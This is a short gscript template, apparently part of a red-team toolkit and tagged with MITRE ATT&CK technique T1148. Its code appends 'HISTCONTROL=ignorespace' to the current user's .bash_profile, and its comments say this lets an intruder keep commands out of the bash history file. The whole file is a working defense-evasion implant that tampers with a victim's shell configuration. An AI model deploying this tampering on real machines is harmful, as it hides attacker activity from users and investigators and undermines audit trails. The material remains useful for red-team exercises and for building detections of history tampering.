// Example gscript template
// Title: Tamper Histcontrol 
// Author: ahhh
// Purpose: sets HISTCONTROL=ignorespace for bash shells, such that a malicious user can launch new terminals and use this to evade the history file
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1148

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Starting Tamper Histcontrol");
  return true; 
}

function Deploy() {  
  var whoami = GetUser();
  var file_location = "/Users/"+whoami.username+"/.bash_profile";
  LogInfo("File Location: "+ file_location);
  var histcontrol_bytes = StringToByteArray("HISTCONTROL=ignorespace");
  var obj = AppendFileBytes(file_location, histcontrol_bytes);
  LogInfo(obj.fileError);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Tamper Histcontrol");
  return true;
}